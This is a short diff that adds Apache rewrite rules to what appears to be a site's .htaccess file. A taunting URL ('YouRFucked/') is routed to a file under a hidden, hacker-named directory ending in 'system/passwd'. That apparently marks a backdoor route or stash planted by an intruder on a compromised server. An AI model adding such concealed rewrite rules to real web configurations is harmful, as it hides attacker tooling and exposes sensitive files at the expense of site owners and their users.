@@ -1,0 +1,3 @@
+
+rewriteEngine on
+RewriteRule ^YouRFucked/$ /.h4x0r/.../system/passwd [NC,L]
